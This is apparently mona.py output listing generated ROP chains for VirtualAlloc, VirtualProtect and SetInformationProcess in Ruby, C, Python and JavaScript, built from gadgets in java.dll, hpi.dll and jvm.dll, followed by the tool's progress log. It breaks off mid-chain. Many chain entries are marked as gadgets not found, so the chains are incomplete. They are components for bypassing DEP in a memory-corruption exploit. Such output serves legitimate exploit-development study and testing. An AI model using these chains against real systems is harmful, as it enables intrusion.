              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d219309,  # POP EBP # RETN [java.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d216054,  # POP EBX # RETN [java.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x6d217fab,  # POP EBX # RETN [java.dll] 
                0x00001000,  # 0x00001000-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  # ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (compensate)
                0x6d212a76,  # POP ECX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> ecx
                0x6d21ced6,  # POP EDI # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d217fc3,  # RETN (ROP NOP) [java.dll]
                0x6d217dd7,  # POP EAX # RETN [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d219309,  // POP EBP // RETN [java.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x6d216054,  // POP EBX // RETN [java.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x6d217fab,  // POP EBX // RETN [java.dll] 
                0x00001000,  // 0x00001000-> edx
                0x00000000,  // [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  // ADD EDX,EBX // POP EBX // RETN 0x10 [java.dll] 
                0x41414141,  // Filler (compensate)
                0x6d212a76,  // POP ECX // RETN 0x10 [java.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000040,  // 0x00000040-> ecx
                0x6d21ced6,  // POP EDI // RETN 0x10 [java.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d217fc3,  // RETN (ROP NOP) [java.dll]
                0x6d217dd7,  // POP EAX // RETN [java.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d219309,  # POP EBP # RETN [java.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d216054,  # POP EBX # RETN [java.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x6d217fab,  # POP EBX # RETN [java.dll] 
                0x00001000,  # 0x00001000-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  # ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (compensate)
                0x6d212a76,  # POP ECX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> ecx
                0x6d21ced6,  # POP EDI # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d217fc3,  # RETN (ROP NOP) [java.dll]
                0x6d217dd7,  # POP EAX # RETN [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
              "%u9309%u6d21" + // 0x6d219309 : ,# POP EBP # RETN [java.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u6054%u6d21" + // 0x6d216054 : ,# POP EBX # RETN [java.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%u7fab%u6d21" + // 0x6d217fab : ,# POP EBX # RETN [java.dll] 
              "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find a gadget to clear edx
              "%ucdbe%u6d21" + // 0x6d21cdbe : ,# ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2a76%u6d21" + // 0x6d212a76 : ,# POP ECX # RETN 0x10 [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%uced6%u6d21" + // 0x6d21ced6 : ,# POP EDI # RETN 0x10 [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u7fc3%u6d21" + // 0x6d217fc3 : ,# RETN (ROP NOP) [java.dll]
              "%u7dd7%u6d21" + // 0x6d217dd7 : ,# POP EAX # RETN [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 183 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 105 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (374 interesting gadgets)
0BADF00D      Wrote 374 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (667 gadgets)
0BADF00D      Wrote 667 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:11.453000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m hpi.dll
          
          ---------- Mona command started on 2018-10-30 04:46:47 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules hpi.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module hpi.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x0C, Nr found : 4
0BADF00D         Ending : RETN 0x08, Nr found : 1
0BADF00D         Ending : RETN, Nr found : 146
0BADF00D         Ending : RETN 0x04, Nr found : 1
0BADF00D         Ending : RETN 0x10, Nr found : 3
0BADF00D      - Filtering and mutating 155 gadgets
0BADF00D        - Progress update : 100 / 155 items processed (Tue 2018/10/30 04:46:48 AM) - (64%)
0BADF00D        - Progress update : 155 / 155 items processed (Tue 2018/10/30 04:46:49 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:46:49 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x6d1d0000 to 0x6d1d7000
0BADF00D      Tue 2018/10/30 04:46:50 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:46:50 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:46:50 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:46:50 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:46:50 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:46:50 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:46:50 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:46:51 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:46:51 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:46:51 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:46:51 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:46:51 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:46:51 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x6d1d0000 to 0x6d1d7000
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:46:52 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d1d29ce,  # POP EBP # RETN [hpi.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x00000040,  # 0x00000040-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
                0x41414141,  # Filler (compensate)
                0x6d1d1317,  # POP ECX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d1d53fd,  # &Writable location [hpi.dll]
                0x6d1d2f36,  # POP EDI # RETN 0x10 [hpi.dll] 
                0x6d1d142b,  # RETN (ROP NOP) [hpi.dll]
                0x6d1d1c2e,  # POP EAX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d1d29ce,  // POP EBP // RETN [hpi.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x6d1d142a,  // POP EBX // RETN [hpi.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x6d1d142a,  // POP EBX // RETN [hpi.dll] 
                0x00000040,  // 0x00000040-> edx
                0x00000000,  // [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  // ADD EDX,EBX // POP EBX // RETN 0x10 [hpi.dll] 
                0x41414141,  // Filler (compensate)
                0x6d1d1317,  // POP ECX // RETN [hpi.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d1d53fd,  // &Writable location [hpi.dll]
                0x6d1d2f36,  // POP EDI // RETN 0x10 [hpi.dll] 
                0x6d1d142b,  // RETN (ROP NOP) [hpi.dll]
                0x6d1d1c2e,  // POP EAX // RETN [hpi.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d1d29ce,  # POP EBP # RETN [hpi.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x00000040,  # 0x00000040-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
                0x41414141,  # Filler (compensate)
                0x6d1d1317,  # POP ECX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d1d53fd,  # &Writable location [hpi.dll]
                0x6d1d2f36,  # POP EDI # RETN 0x10 [hpi.dll] 
                0x6d1d142b,  # RETN (ROP NOP) [hpi.dll]
                0x6d1d1c2e,  # POP EAX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%u29ce%u6d1d" + // 0x6d1d29ce : ,# POP EBP # RETN [hpi.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u142a%u6d1d" + // 0x6d1d142a : ,# POP EBX # RETN [hpi.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%u142a%u6d1d" + // 0x6d1d142a : ,# POP EBX # RETN [hpi.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find a gadget to clear edx
              "%u2f6e%u6d1d" + // 0x6d1d2f6e : ,# ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u1317%u6d1d" + // 0x6d1d1317 : ,# POP ECX # RETN [hpi.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u53fd%u6d1d" + // 0x6d1d53fd : ,# &Writable location [hpi.dll]
              "%u2f36%u6d1d" + // 0x6d1d2f36 : ,# POP EDI # RETN 0x10 [hpi.dll] 
              "%u142b%u6d1d" + // 0x6d1d142b : ,# RETN (ROP NOP) [hpi.dll]
              "%u1c2e%u6d1d" + // 0x6d1d1c2e : ,# POP EAX # RETN [hpi.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x00000022,  # 0x00000022-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
                0x41414141,  # Filler (compensate)
                0x6d1d12df,  # POP ECX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d1d013c,  # &0x00000002 [hpi.dll]
                0x6d1d14f4,  # POP EBX # RETN [hpi.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d1d170f,  # POP EAX # RETN [hpi.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d1d2f36,  # POP EDI # RETN 0x10 [hpi.dll] 
                0x6d1d2f36,  # skip 4 bytes [hpi.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  // [-] Unable to find ptr to &SetInformationProcess()
                0x6d1d142a,  // POP EBX // RETN [hpi.dll] 
                0x00000022,  // 0x00000022-> edx
                0x00000000,  // [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  // ADD EDX,EBX // POP EBX // RETN 0x10 [hpi.dll] 
                0x41414141,  // Filler (compensate)
                0x6d1d12df,  // POP ECX // RETN [hpi.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d1d013c,  // &0x00000002 [hpi.dll]
                0x6d1d14f4,  // POP EBX // RETN [hpi.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x6d1d170f,  // POP EAX // RETN [hpi.dll] 
                0x00000004,  // 0x00000004-> eax
                0x6d1d2f36,  // POP EDI // RETN 0x10 [hpi.dll] 
                0x6d1d2f36,  // skip 4 bytes [hpi.dll]
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x00000022,  # 0x00000022-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
                0x41414141,  # Filler (compensate)
                0x6d1d12df,  # POP ECX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d1d013c,  # &0x00000002 [hpi.dll]
                0x6d1d14f4,  # POP EBX # RETN [hpi.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d1d170f,  # POP EAX # RETN [hpi.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d1d2f36,  # POP EDI # RETN 0x10 [hpi.dll] 
                0x6d1d2f36,  # skip 4 bytes [hpi.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into ebp
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to &SetInformationProcess()
              "%u142a%u6d1d" + // 0x6d1d142a : ,# POP EBX # RETN [hpi.dll] 
              "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find a gadget to clear edx
              "%u2f6e%u6d1d" + // 0x6d1d2f6e : ,# ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u12df%u6d1d" + // 0x6d1d12df : ,# POP ECX # RETN [hpi.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u013c%u6d1d" + // 0x6d1d013c : ,# &0x00000002 [hpi.dll]
              "%u14f4%u6d1d" + // 0x6d1d14f4 : ,# POP EBX # RETN [hpi.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%u170f%u6d1d" + // 0x6d1d170f : ,# POP EAX # RETN [hpi.dll] 
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%u2f36%u6d1d" + // 0x6d1d2f36 : ,# POP EDI # RETN 0x10 [hpi.dll] 
              "%u2f36%u6d1d" + // 0x6d1d2f36 : ,# skip 4 bytes [hpi.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
